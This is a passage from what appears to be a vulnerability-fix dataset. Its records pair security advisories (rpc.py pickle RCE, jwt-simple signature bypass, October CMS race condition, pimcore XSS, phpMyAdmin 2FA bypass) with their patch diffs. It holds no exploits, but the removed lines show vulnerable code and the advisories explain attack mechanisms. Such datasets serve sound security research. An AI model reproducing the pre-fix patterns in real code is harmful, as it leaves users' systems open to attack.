directory: \" + canonicalPath);\\n+                throw new IOException(\"Error extracting \" + zipfile + \": Canonical path of zip entry: \" +\\n+                        entry.getName() + \" (\" + canonicalPath + \") does not start with permissible temp \" +\\n+                        \"unzip directory (\" + destinationDir + \")\");\\n+            }\\n             if (entry.isDirectory())\\n             {\\n-                if (!new File(zipDir + entry.getName()).mkdir())\\n-                {\\n+                \/\/ Log error and throw IOException if a directory entry could not be created\\n+                File newDir = new File(zipDir + entry.getName());\\n+                if (!newDir.mkdirs()) {\\n                     log.error(\"Unable to create contents directory: \" + zipDir + entry.getName());\\n+                    throw new IOException(\"Unable to create contents directory: \" + zipDir + entry.getName());\\n                 }\\n             }\\n             else\\n@@ -2074,6 +2097,7 @@ public static String unzip(File zipfile, String destDir) throws IOException {\\n                 byte[] buffer = new byte[1024];\\n                 int len;\\n                 InputStream in = zf.getInputStream(entry);\\n+                log.debug(\"Reading \" + zipDir + entry.getName() + \" into InputStream\");\\n                 BufferedOutputStream out = new BufferedOutputStream(\\n                         new FileOutputStream(zipDir + entry.getName()));\\n                 while((len = in.read(buffer)) >= 0)'}}","message_norm":"[ds-4131] better path handling in itemimport zips","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['dspace-api\/src\/main\/java\/org\/dspace\/app\/itemimport\/ItemImport.java'])","num_files":1.0},{"index":1254,"vuln_id":"GHSA-8rq8-f485-7v8x","cwe_id":"{'CWE-502'}","score":9.8,"chain":"{'https:\/\/github.com\/abersheeran\/rpc.py\/commit\/491e7a841ed9a754796d6ab047a9fb16e23bf8bd'}","dataset":"osv","summary":"rpc.py 0.6.0 vulnerable to Deserialization of Untrusted Data rpc.py through 0.6.0 allows Remote Code Execution because an unpickle occurs when the \"serializer: pickle\" HTTP header is sent. In other words, although JSON (not Pickle) is the default data format, an unauthenticated client can cause the data to be processed with unpickle.\n\n[Per the maintainer](https:\/\/github.com\/abersheeran\/rpc.py\/issues\/22), rpc.py is not designed for an API that is open to the outside world, and external requests cannot reach rpc.py in real world use.\n\nA [fix](https:\/\/github.com\/abersheeran\/rpc.py\/commit\/491e7a841ed9a754796d6ab047a9fb16e23bf8bd) exists on the `master` branch. As a workaround, use the following code to turn off pickle in older versions:\n```\ndel SERIALIZER_NAMES[PickleSerializer.name]\ndel SERIALIZER_TYPES[PickleSerializer.content_type]","published_date":"2022-07-09","chain_len":1,"project":"https:\/\/github.com\/abersheeran\/rpc.py","commit_href":"https:\/\/github.com\/abersheeran\/rpc.py\/commit\/491e7a841ed9a754796d6ab047a9fb16e23bf8bd","commit_sha":"491e7a841ed9a754796d6ab047a9fb16e23bf8bd","patch":"SINGLE","chain_ord":"['491e7a841ed9a754796d6ab047a9fb16e23bf8bd']","before_first_fix_commit":"{'3d5c31916a597f8bdd3260c50d6ec398da1c421c'}","last_fix_commit":"491e7a841ed9a754796d6ab047a9fb16e23bf8bd","chain_ord_pos":1.0,"commit_datetime":"07\/06\/2022, 04:55:59","message":"PickleSerializer is turned off by default","author":"Aber","comments":null,"stats":"{'additions': 7, 'deletions': 2, 'total': 9}","files":"{'rpcpy\/serializers.py': {'additions': 7, 'deletions': 2, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/abersheeran\/rpc.py\/raw\/491e7a841ed9a754796d6ab047a9fb16e23bf8bd\/rpcpy%2Fserializers.py', 'patch': '@@ -108,16 +108,21 @@ def decode(self, data: bytes) -> typing.Any:\\n         return cbor.loads(data)\\n \\n \\n+# Since the release of pickle to the external network may lead to\\n+# arbitrary code execution vulnerabilities, this serialization\\n+# method is not enabled by default. It is recommended to turn it on\\n+# when there is physical isolation from the outside.\\n+\\n SERIALIZER_NAMES = {\\n     JSONSerializer.name: JSONSerializer(),\\n-    PickleSerializer.name: PickleSerializer(),\\n+    # PickleSerializer.name: PickleSerializer(),\\n     MsgpackSerializer.name: MsgpackSerializer(),\\n     CBORSerializer.name: CBORSerializer(),\\n }\\n \\n SERIALIZER_TYPES = {\\n     JSONSerializer.content_type: JSONSerializer(),\\n-    PickleSerializer.content_type: PickleSerializer(),\\n+    # PickleSerializer.content_type: PickleSerializer(),\\n     MsgpackSerializer.content_type: MsgpackSerializer(),\\n     CBORSerializer.content_type: CBORSerializer(),\\n }'}}","message_norm":"pickleserializer is turned off by default","language":"en","entities":"[('pickleserializer', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['rpcpy\/serializers.py'])","num_files":1.0},{"index":1256,"vuln_id":"GHSA-8v3j-jfg3-v3fv","cwe_id":"{'CWE-1321'}","score":9.8,"chain":"{'https:\/\/github.com\/balderdashy\/sails\/commit\/7c5379a656bb305c958df1dcc2b51a9668830358'}","dataset":"osv","summary":"Prototype Pollution in Sails.js Sails.js <= 1.5.2 is vulnerable to Prototype Pollution via controller\/load-action-modules.js, function loadActionModules(). A [patch](https:\/\/github.com\/balderdashy\/sails\/commit\/7c5379a656bb305c958df1dcc2b51a9668830358) is available in the `master` branch of Sails.js's GItHub repository.","published_date":"2022-03-18","chain_len":1,"project":"https:\/\/github.com\/balderdashy\/sails","commit_href":"https:\/\/github.com\/balderdashy\/sails\/commit\/7c5379a656bb305c958df1dcc2b51a9668830358","commit_sha":"7c5379a656bb305c958df1dcc2b51a9668830358","patch":"SINGLE","chain_ord":"['7c5379a656bb305c958df1dcc2b51a9668830358']","before_first_fix_commit":"{'06ce9cfbe6533734879079e02b0ef7b62f9ce31b'}","last_fix_commit":"7c5379a656bb305c958df1dcc2b51a9668830358","chain_ord_pos":1.0,"commit_datetime":"03\/18\/2022, 22:07:29","message":"closes https:\/\/github.com\/balderdashy\/sails\/issues\/7209","author":"Mike McNeil","comments":null,"stats":"{'additions': 3, 'deletions': 0, 'total': 3}","files":"{'docs\/reference\/application\/advanced-usage\/sails.reloadActions.md': {'additions': 3, 'deletions': 0, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/balderdashy\/sails\/raw\/7c5379a656bb305c958df1dcc2b51a9668830358\/docs%2Freference%2Fapplication%2Fadvanced-usage%2Fsails.reloadActions.md', 'patch': '@@ -25,6 +25,9 @@ This method is useful primarily in development scenarios.\\n | 1 |      _options_      | ((dictionary?))          | Currently accepts one key, `hooksToSkip`, which if given should be an array of names of hooks that should _not_ call their `reloadActions` method.\\n | 2 |      _callback_              | ((function)) | A callback to be called with the virtual response.\\n \\n+### Notes\\n+> - Never dynamically replace your Sails.js controller or action files on disk with untrusted code at runtime, regardless of whether you are using `.reloadActions()` in your app or not.  Since `reloadActions()` runs the code in your Sails.js app\\'s files, if the files are not safe to run, then using `reloadActions()` would be [a security risk](https:\/\/github.com\/balderdashy\/sails\/issues\/7209).  This risk is only present if your Sails app is deliberately overwriting its own files to replace them with unsafe code.\\n+\\n \\n <docmeta name=\"displayName\" value=\"sails.reloadActions()\">\\n <docmeta name=\"pageType\" value=\"method\">'}}","message_norm":"closes https:\/\/github.com\/balderdashy\/sails\/issues\/7209","language":"es","entities":"[('https:\/\/github.com\/balderdashy\/sails\/issues\/7209', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['docs\/reference\/application\/advanced-usage\/sails.reloadActions.md'])","num_files":1.0},{"index":1257,"vuln_id":"GHSA-8v5f-hp78-jgxq","cwe_id":"{'CWE-347'}","score":0.0,"chain":"{'https:\/\/github.com\/hokaccha\/node-jwt-simple\/commit\/ead36e1d687645da9c3be8befdaaef622ea33106'}","dataset":"osv","summary":"Signature Verification Bypass in jwt-simple Versions of `jwt-simple` prior to 0.5.3 are vulnerable to Signature Verification Bypass. If no algorithm is specified in the `decode()` function, the packages uses the algorithm in the JWT to decode tokens. This allows an attacker to create a HS256 (symmetric algorithm) JWT with the server's public key as secret, and the package will verify it as HS256 instead of RS256 (asymmetric algorithm).\n\n\n## Recommendation\n\nUpgrade to version 0.5.3 or later.","published_date":"2019-06-06","chain_len":1,"project":"https:\/\/github.com\/hokaccha\/node-jwt-simple","commit_href":"https:\/\/github.com\/hokaccha\/node-jwt-simple\/commit\/ead36e1d687645da9c3be8befdaaef622ea33106","commit_sha":"ead36e1d687645da9c3be8befdaaef622ea33106","patch":"SINGLE","chain_ord":"['ead36e1d687645da9c3be8befdaaef622ea33106']","before_first_fix_commit":"{'ecb19a046432f3e9d9490c10c74c1d6f123c18e0'}","last_fix_commit":"ead36e1d687645da9c3be8befdaaef622ea33106","chain_ord_pos":1.0,"commit_datetime":"12\/14\/2017, 01:56:51","message":"Use RS256 if algorithm is undefined but key is RSA","author":"Daniel","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'lib\/jwt.js': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/hokaccha\/node-jwt-simple\/raw\/ead36e1d687645da9c3be8befdaaef622ea33106\/lib%2Fjwt.js', 'patch': \"@@ -76,6 +76,10 @@ jwt.decode = function jwt_decode(token, key, noVerify, algorithm) {\\n   var payload = JSON.parse(base64urlDecode(payloadSeg));\\n \\n   if (!noVerify) {\\n+    if (!algorithm && \/BEGIN( RSA)? PUBLIC KEY\/.test(key.toString())) {\\n+      algorithm = 'RS256';\\n+    }\\n+\\n     var signingMethod = algorithmMap[algorithm || header.alg];\\n     var signingType = typeMap[algorithm || header.alg];\\n     if (!signingMethod || !signingType) {\"}}","message_norm":"use rs256 if algorithm is undefined but key is rsa","language":"en","entities":"[('key', 'SECWORD', ''), ('rsa', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/jwt.js'])","num_files":1.0},{"index":1261,"vuln_id":"GHSA-8v7h-cpc2-r8jp","cwe_id":"{'CWE-362'}","score":8.1,"chain":"{'https:\/\/github.com\/octobercms\/library\/commit\/fe569f3babf3f593be2b1e0a4ae0283506127a83'}","dataset":"osv","summary":"October CMS upload process vulnerable to RCE via Race Condition ### Impact\n\nThis advisory affects plugins that expose the `October\\Rain\\Database\\Attach\\File::fromData` as a public interface. This vulnerability does not affect vanilla installations of October CMS since this method is not exposed or used by the system internally or externally.\n\nWhen the developer allows the user to specify their own filename in the `fromData` method, an unauthenticated user can perform remote code execution (RCE) by exploiting a race condition in the temporary storage directory.\n\n### Patches\n\nThe issue has been patched in Build 476 (v1.0.476) and v1.1.12 and v2.2.15.\n\n### Workarounds\n\nApply https:\/\/github.com\/octobercms\/library\/commit\/fe569f3babf3f593be2b1e0a4ae0283506127a83 to your installation manually if unable to upgrade to Build 476 (v1.0.476) or v1.1.12 or v2.2.15.\n\n### References\n\nCredits to:\n- DucNT, HungTD and GiangVQ from RedTeam@VNG Security Response Center.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n- Email us at [hello@octobercms.com](mailto:hello@octobercms.com)","published_date":"2022-07-13","chain_len":1,"project":"https:\/\/github.com\/octobercms\/library","commit_href":"https:\/\/github.com\/octobercms\/library\/commit\/fe569f3babf3f593be2b1e0a4ae0283506127a83","commit_sha":"fe569f3babf3f593be2b1e0a4ae0283506127a83","patch":"SINGLE","chain_ord":"['fe569f3babf3f593be2b1e0a4ae0283506127a83']","before_first_fix_commit":"{'95ce496038c104571362c92418783b81889a8b9d'}","last_fix_commit":"fe569f3babf3f593be2b1e0a4ae0283506127a83","chain_ord_pos":1.0,"commit_datetime":"03\/29\/2022, 01:51:19","message":"Refactor","author":"Sam Georges","comments":null,"stats":"{'additions': 5, 'deletions': 4, 'total': 9}","files":"{'src\/Database\/Attach\/File.php': {'additions': 5, 'deletions': 4, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/octobercms\/library\/raw\/fe569f3babf3f593be2b1e0a4ae0283506127a83\/src%2FDatabase%2FAttach%2FFile.php', 'patch': \"@@ -124,14 +124,14 @@ public function fromPost($uploadedFile)\\n     \/**\\n      * fromFile creates a file object from a file on the disk\\n      *\/\\n-    public function fromFile($filePath)\\n+    public function fromFile($filePath, $filename = null)\\n     {\\n         if ($filePath === null) {\\n             return;\\n         }\\n \\n         $file = new FileObj($filePath);\\n-        $this->file_name = $file->getFilename();\\n+        $this->file_name = empty($filename) ? $file->getFilename() : $filename;\\n         $this->file_size = $file->getSize();\\n         $this->content_type = $file->getMimeType();\\n         $this->disk_name = $this->getDiskName();\\n@@ -152,10 +152,11 @@ public function fromData($data, $filename)\\n             return;\\n         }\\n \\n-        $tempPath = temp_path(basename($filename));\\n+        $tempName = str_replace('.', '', uniqid('', true)) . '.tmp';\\n+        $tempPath = temp_path($tempName);\\n         FileHelper::put($tempPath, $data);\\n \\n-        $file = $this->fromFile($tempPath);\\n+        $file = $this->fromFile($tempPath, basename($filename));\\n         FileHelper::delete($tempPath);\\n \\n         return $file;\"}}","message_norm":"refactor","language":"ro","entities":null,"classification_level_1":"POORLY_DOCUMENTED","classification_level_2":"SINGLE_WORD","list_files":"dict_keys(['src\/Database\/Attach\/File.php'])","num_files":1.0},{"index":1262,"vuln_id":"GHSA-8v99-48m9-c8pm","cwe_id":"{'CWE-863'}","score":7.5,"chain":"{'https:\/\/github.com\/containerd\/imgcrypt\/commit\/6fdd9818a4d8142107b7ecd767d839c9707700d9'}","dataset":"osv","summary":"Incorrect Authorization in imgcrypt Imgcrypt implements a function `CheckAuthorization()` that is supposed to check whether a user is authorized to access an encrypted image given the keys that the user has provided on the command line that would enable decryption of the image. The check is to prevent that a user can start a container from an image that has previously been decrypted by another user on the same system and therefore a decrypted version of the image layers may be already available in the cache locally.\n\nThe failure occurs when an image with a ManifestList is used and the architecture of the local host is not the first one in the ManifestList. In the version prior to the fix, only the first architecture in the list was tested, which may not have its layers available locally (were not pulled) since it cannot be run on the host architecture. Therefore, the verdict on unavailable layers was that the image could be run anticipating that image run failure would occur later due to the layers not being available. However, this verdict to allow the image to run lead to other architectures in the ManifestList be able to run an image without providing keys if that image had previously been decrypted. The fixed version now skips over irrelevant architectures and tests the Manifest of the local architecture, if available.\n\nKnown projects that use the `CheckAuthorization()` of imgcrypt is for example the ctr-enc client tool provided by imgcrypt. In this implementation, the call to `CheckAuthorization()` is used on the client side and could therefore also be easily circumvented by a modified client tool not calling this function.\n\nIn relation to the vulnerability in ctr-enc, affected environments would have to allow different users to invoke ctr-enc indirectly using some sort of management stack that gives user indirect access to ctr-enc.\n\nThe patch has been applied to imgcrypt v1.1.4. Workarounds may include usage of different namespaces for each remote user.","published_date":"2022-03-28","chain_len":1,"project":"https:\/\/github.com\/containerd\/imgcrypt","commit_href":"https:\/\/github.com\/containerd\/imgcrypt\/commit\/6fdd9818a4d8142107b7ecd767d839c9707700d9","commit_sha":"6fdd9818a4d8142107b7ecd767d839c9707700d9","patch":"SINGLE","chain_ord":"['6fdd9818a4d8142107b7ecd767d839c9707700d9']","before_first_fix_commit":"{'f4400580b658c1fcb3cacc52dfb6104ea3c3aa82'}","last_fix_commit":"6fdd9818a4d8142107b7ecd767d839c9707700d9","chain_ord_pos":1.0,"commit_datetime":"03\/17\/2022, 19:52:56","message":"images: Add list of Platforms to CheckAuthorization()\n\nTo be able to properly perform an authorization check on an image we need\nto know the platform to perform check when in cryptManifestList(). Extend\nthe logic for cryptoOp == cryptoOpUnwrapOnly to skip over manifests that\ndo not correspond to the local platform and return an error if no manifest\nwas found that matches the local platform.\n\nThe following projects seem NOT to be affect due to the change in the code\npath of CheckAuthorization() since they are not using it:\n\n- cri-o\n- nerdctl\n- skopeo\n- buildah\n- podman\n\nThe impact on imgcrypt via ctr-enc is not so clear either since\nCheckAuthorization() is not called on the server side but by the ctr-enc\nclient, thus can be modified easily.\n\nResolves: https:\/\/github.com\/containerd\/imgcrypt\/issues\/69\nSigned-off-by: Stefan Berger <stefanb@linux.ibm.com>","author":"Stefan Berger","comments":null,"stats":"{'additions': 13, 'deletions': 0, 'total': 13}","files":"{'images\/encryption\/encryption.go': {'additions': 13, 'deletions': 0, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/containerd\/imgcrypt\/raw\/6fdd9818a4d8142107b7ecd767d839c9707700d9\/images%2Fencryption%2Fencryption.go', 'patch': '@@ -50,6 +50,13 @@ const (\\n \/\/ LayerFilter allows to select Layers by certain criteria\\n type LayerFilter func(desc ocispec.Descriptor) bool\\n \\n+\/\/ isLocalPlatform determines whether the given platform matches the local one\\n+func isLocalPlatform(platform *ocispec.Platform) bool {\\n+\\tmatcher := platforms.NewMatcher(*platform)\\n+\\n+\\treturn matcher.Match(platforms.DefaultSpec())\\n+}\\n+\\n \/\/ IsEncryptedDiff returns true if mediaType is a known encrypted media type.\\n func IsEncryptedDiff(ctx context.Context, mediaType string) bool {\\n \\tswitch mediaType {\\n@@ -380,6 +387,9 @@ func cryptManifestList(ctx context.Context, cs content.Store, desc ocispec.Descr\\n \\tvar newManifests []ocispec.Descriptor\\n \\tmodified := false\\n \\tfor _, manifest := range index.Manifests {\\n+\\t\\tif cryptoOp == cryptoOpUnwrapOnly && !isLocalPlatform(manifest.Platform) {\\n+\\t\\t\\tcontinue\\n+\\t\\t}\\n \\t\\tnewManifest, m, err := cryptChildren(ctx, cs, manifest, cc, lf, cryptoOp, manifest.Platform)\\n \\t\\tif err != nil || cryptoOp == cryptoOpUnwrapOnly {\\n \\t\\t\\treturn ocispec.Descriptor{}, false, err\\n@@ -389,6 +399,9 @@ func cryptManifestList(ctx context.Context, cs content.Store, desc ocispec.Descr\\n \\t\\t}\\n \\t\\tnewManifests = append(newManifests, newManifest)\\n \\t}\\n+\\tif cryptoOp == cryptoOpUnwrapOnly {\\n+\\t\\treturn ocispec.Descriptor{}, false, fmt.Errorf(\"No manifest found for local platform\")\\n+\\t}\\n \\n \\tif modified {\\n \\t\\t\/\/ we need to update the index'}}","message_norm":"images: add list of platforms to checkauthorization()\n\nto be able to properly perform an authorization check on an image we need\nto know the platform to perform check when in cryptmanifestlist(). extend\nthe logic for cryptoop == cryptoopunwraponly to skip over manifests that\ndo not correspond to the local platform and return an error if no manifest\nwas found that matches the local platform.\n\nthe following projects seem not to be affect due to the change in the code\npath of checkauthorization() since they are not using it:\n\n- cri-o\n- nerdctl\n- skopeo\n- buildah\n- podman\n\nthe impact on imgcrypt via ctr-enc is not so clear either since\ncheckauthorization() is not called on the server side but by the ctr-enc\nclient, thus can be modified easily.\n\nresolves: https:\/\/github.com\/containerd\/imgcrypt\/issues\/69\nsigned-off-by: stefan berger <stefanb@linux.ibm.com>","language":"en","entities":"[('add', 'ACTION', ''), ('cryptoop', 'SECWORD', ''), ('cryptoopunwraponly', 'SECWORD', ''), ('error', 'FLAW', ''), ('found', 'ACTION', ''), ('server', 'SECWORD', ''), ('https:\/\/github.com\/containerd\/imgcrypt\/issues\/69', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['images\/encryption\/encryption.go'])","num_files":1.0},{"index":1271,"vuln_id":"GHSA-8w3x-r6x7-c5r5","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/pimcore\/pimcore\/commit\/3c2a14e676a57e5d77a16255965988eef48f9065'}","dataset":"osv","summary":"Cross-site Scripting in pimcore pimcore is vulnerable to Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","published_date":"2021-12-16","chain_len":1,"project":"https:\/\/github.com\/pimcore\/pimcore","commit_href":"https:\/\/github.com\/pimcore\/pimcore\/commit\/3c2a14e676a57e5d77a16255965988eef48f9065","commit_sha":"3c2a14e676a57e5d77a16255965988eef48f9065","patch":"SINGLE","chain_ord":"['3c2a14e676a57e5d77a16255965988eef48f9065']","before_first_fix_commit":"{'a5e13bea6315b7bee8fb44f83a38029d065f97a3'}","last_fix_commit":"3c2a14e676a57e5d77a16255965988eef48f9065","chain_ord_pos":1.0,"commit_datetime":"12\/09\/2021, 11:53:00","message":"[Admin UI] DataObject Class - escape general settings input values (#10991)\n\n* [Admin UI] DataObject Class - escape general settings input values\r\n\r\n* Update bundles\/AdminBundle\/Resources\/public\/js\/pimcore\/object\/classes\/class.js\r\n\r\n* [Admin UI] DataObject Class - escape general settings input values\r\n\r\n* [Admin UI] DataObject Class - escape general settings input values","author":"Divesh Pahuja","comments":null,"stats":"{'additions': 20, 'deletions': 1, 'total': 21}","files":"{'bundles\/AdminBundle\/Resources\/public\/js\/pimcore\/object\/classes\/class.js': {'additions': 20, 'deletions': 1, 'changes': 21, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pimcore\/pimcore\/raw\/3c2a14e676a57e5d77a16255965988eef48f9065\/bundles%2FAdminBundle%2FResources%2Fpublic%2Fjs%2Fpimcore%2Fobject%2Fclasses%2Fclass.js', 'patch': '@@ -607,7 +607,12 @@ pimcore.object.classes.klass = Class.create({\\n                 for (var i = 0; i < items.length; i++) {\\n                     var item = items[i];\\n                     if (typeof item.getValue == \"function\") {\\n-                        this.data[item.name] = item.getValue();\\n+                        let value = item.getValue();\\n+                        if (typeof item.config.xtype !== \\'undefined\\' && item.config.xtype === \\'textfield\\') {\\n+                            value = Ext.util.Format.htmlEncode(value);\\n+                        }\\n+\\n+                        this.data[item.name] = value;\\n                     }\\n                 }\\n \\n@@ -705,6 +710,7 @@ pimcore.object.classes.klass = Class.create({\\n             id: \"iconfield-\" + this.getId(),\\n             name: \"icon\",\\n             width: 396,\\n+            renderer: Ext.util.Format.htmlEncode,\\n             value: this.data.icon,\\n             listeners: {\\n                 \"afterrender\": function (el) {\\n@@ -752,6 +758,7 @@ pimcore.object.classes.klass = Class.create({\\n                     width: 500,\\n                     enableKeyEvents: true,\\n                     value: this.data.name,\\n+                    renderer: Ext.util.Format.htmlEncode,\\n                     listeners: {\\n                         keyup: function (el) {\\n                             this.rootPanel.getComponent(\"phpClassName\").setValue(getPhpClassName(el.getValue()))\\n@@ -763,12 +770,14 @@ pimcore.object.classes.klass = Class.create({\\n                     fieldLabel: t(\"description\"),\\n                     name: \"description\",\\n                     width: 500,\\n+                    renderer: Ext.util.Format.htmlEncode,\\n                     value: this.data.description\\n                 },\\n                 {\\n                     xtype: \"textfield\",\\n                     fieldLabel: t(\"unique_identifier\"),\\n                     disabled: true,\\n+                    renderer: Ext.util.Format.htmlEncode,\\n                     value: this.data.id,\\n                     width: 500\\n                 },\\n@@ -779,62 +788,71 @@ pimcore.object.classes.klass = Class.create({\\n                     itemId: \"phpClassName\",\\n                     width: 500,\\n                     disabled: true,\\n+                    renderer: Ext.util.Format.htmlEncode,\\n                     value: getPhpClassName(this.data.name)\\n                 },\\n                 {\\n                     xtype: \"textfield\",\\n                     fieldLabel: t(\"parent_php_class\"),\\n                     name: \"parentClass\",\\n                     width: 600,\\n+                    renderer: Ext.util.Format.htmlEncode,\\n                     value: this.data.parentClass\\n                 },\\n                 {\\n                     xtype: \"textfield\",\\n                     width: 600,\\n                     name: \"implementsInterfaces\",\\n                     fieldLabel: t(\"implements_interfaces\"),\\n+                    renderer: Ext.util.Format.htmlEncode,\\n                     value: this.data.implementsInterfaces\\n                 },\\n                 {\\n                     xtype: \"textfield\",\\n                     fieldLabel: t(\"use_traits\"),\\n                     name: \"useTraits\",\\n                     width: 600,\\n+                    renderer: Ext.util.Format.htmlEncode,\\n                     value: this.data.useTraits\\n                 },\\n                 {\\n                     xtype: \"textfield\",\\n                     fieldLabel: t(\"listing_parent_php_class\"),\\n                     name: \"listingParentClass\",\\n                     width: 600,\\n+                    renderer: Ext.util.Format.htmlEncode,\\n                     value: this.data.listingParentClass\\n                 },\\n                 {\\n                     xtype: \"textfield\",\\n                     fieldLabel: t(\"listing_use_traits\"),\\n                     name: \"listingUseTraits\",\\n                     width: 600,\\n+                    renderer: Ext.util.Format.htmlEncode,\\n                     value: this.data.listingUseTraits\\n                 },\\n                 {\\n                     xtype: \"textfield\",\\n                     fieldLabel: t(\"link_generator_reference\"),\\n                     name: \"linkGeneratorReference\",\\n                     width: 600,\\n+                    renderer: Ext.util.Format.htmlEncode,\\n                     value: this.data.linkGeneratorReference\\n                 },\\n                 {\\n                     xtype: \"textfield\",\\n                     fieldLabel: t(\"preview_generator_reference\"),\\n                     name: \"previewGeneratorReference\",\\n                     width: 600,\\n+                    renderer: Ext.util.Format.htmlEncode,\\n                     value: this.data.previewGeneratorReference\\n                 },\\n                 {\\n                     xtype: \"textfield\",\\n                     fieldLabel: t(\"preview_url\"),\\n                     name: \"previewUrl\",\\n                     width: 600,\\n+                    renderer: Ext.util.Format.htmlEncode,\\n                     value: this.data.previewUrl\\n                 },\\n                 {\\n@@ -885,6 +903,7 @@ pimcore.object.classes.klass = Class.create({\\n                     fieldLabel: t(\"group\"),\\n                     name: \"group\",\\n                     width: 600,\\n+                    renderer: Ext.util.Format.htmlEncode,\\n                     value: this.data.group\\n                 },\\n                 this.allowInheritance,'}}","message_norm":"[admin ui] dataobject class - escape general settings input values (#10991)\n\n* [admin ui] dataobject class - escape general settings input values\r\n\r\n* update bundles\/adminbundle\/resources\/public\/js\/pimcore\/object\/classes\/class.js\r\n\r\n* [admin ui] dataobject class - escape general settings input values\r\n\r\n* [admin ui] dataobject class - escape general settings input values","language":"ca","entities":"[('admin', 'SECWORD', ''), ('escape', 'SECWORD', ''), ('#10991', 'ISSUE', ''), ('admin', 'SECWORD', ''), ('escape', 'SECWORD', ''), ('update', 'ACTION', ''), ('adminbundle', 'SECWORD', ''), ('admin', 'SECWORD', ''), ('escape', 'SECWORD', ''), ('admin', 'SECWORD', ''), ('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bundles\/AdminBundle\/Resources\/public\/js\/pimcore\/object\/classes\/class.js'])","num_files":1.0},{"index":1274,"vuln_id":"GHSA-8wf2-3ggj-78q9","cwe_id":"{'CWE-287'}","score":4.3,"chain":"{'https:\/\/github.com\/phpmyadmin\/phpmyadmin\/commit\/ca54f1db050859eb8555875c6aa5d7796fdf4b32'}","dataset":"osv","summary":"Improper Authentication in phpmyadmin An issue was discovered in phpMyAdmin 4.9 before 4.9.8 and 5.1 before 5.1.2. A valid user who is already authenticated to phpMyAdmin can manipulate their account to bypass two-factor authentication for future login instances.","published_date":"2022-01-28","chain_len":1,"project":"https:\/\/github.com\/phpmyadmin\/phpmyadmin","commit_href":"https:\/\/github.com\/phpmyadmin\/phpmyadmin\/commit\/ca54f1db050859eb8555875c6aa5d7796fdf4b32","commit_sha":"ca54f1db050859eb8555875c6aa5d7796fdf4b32","patch":"SINGLE","chain_ord":"['ca54f1db050859eb8555875c6aa5d7796fdf4b32']","before_first_fix_commit":"{'ae11d5260b4bde42100c8696218a2bfd11a2d740'}","last_fix_commit":"ca54f1db050859eb8555875c6aa5d7796fdf4b32","chain_ord_pos":1.0,"commit_datetime":"01\/13\/2022, 01:59:41","message":"security - Fix - 2FA\/U2F can be disabled without any code change\n\nSigned-off-by: William Desportes <williamdes@wdes.fr>","author":"William Desportes","comments":null,"stats":"{'additions': 16, 'deletions': 11, 'total': 27}","files":"{'libraries\/classes\/DatabaseInterface.php': {'additions': 16, 'deletions': 11, 'changes': 27, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/phpmyadmin\/phpmyadmin\/raw\/ca54f1db050859eb8555875c6aa5d7796fdf4b32\/libraries%2Fclasses%2FDatabaseInterface.php', 'patch': '@@ -1563,17 +1563,22 @@ public function setCollation($collation)\\n      *\/\\n     public function initRelationParamsCache()\\n     {\\n-        if (strlen($GLOBALS[\\'db\\'])) {\\n-            $cfgRelation = $this->relation->getRelationsParam();\\n-            if (empty($cfgRelation[\\'db\\'])) {\\n-                $this->relation->fixPmaTables($GLOBALS[\\'db\\'], false);\\n-            }\\n-        }\\n-        $cfgRelation = $this->relation->getRelationsParam();\\n-        if (empty($cfgRelation[\\'db\\']) && isset($GLOBALS[\\'dblist\\'])) {\\n-            if ($GLOBALS[\\'dblist\\']->databases->exists(\\'phpmyadmin\\')) {\\n-                $this->relation->fixPmaTables(\\'phpmyadmin\\', false);\\n-            }\\n+        $storageDbName = $GLOBALS[\\'cfg\\'][\\'Server\\'][\\'pmadb\\'] ?? \\'\\';\\n+        \/\/ Use \"phpmyadmin\" as a default database name to check to keep the behavior consistent\\n+        $storageDbName = $storageDbName !== null\\n+                            && is_string($storageDbName)\\n+                            && $storageDbName !== \\'\\' ? $storageDbName : \\'phpmyadmin\\';\\n+\\n+        \/\/ This will make users not having explicitly listed databases\\n+        \/\/ have config values filled by the default phpMyAdmin storage table name values\\n+        $this->relation->fixPmaTables($storageDbName, false);\\n+\\n+        \/\/ This global will be changed if fixPmaTables did find one valid table\\n+        $storageDbName = $GLOBALS[\\'cfg\\'][\\'Server\\'][\\'pmadb\\'] ?? \\'\\';\\n+\\n+        \/\/ Empty means that until now no pmadb was found eligible\\n+        if (empty($storageDbName)) {\\n+            $this->relation->fixPmaTables($GLOBALS[\\'db\\'], false);\\n         }\\n     }'}}","message_norm":"security - fix - 2fa\/u2f can be disabled without any code change\n\nsigned-off-by: william desportes <williamdes@wdes.fr>","language":"en","entities":"[('security', 'SECWORD', ''), ('williamdes@wdes.fr', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['libraries\/classes\/DatabaseInterface.php'])","num_files":1.0},{"index":1281,"vuln_id":"GHSA-8x44-pwr2-rgc6","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/pimcore\/pimcore\/commit\/832c34aeb9f21f213295a0c28377132df996352a'}","dataset":"osv","summary":"Cross-site Scripting in pimcore Pimcore settings module is vulnerable to stored cross site 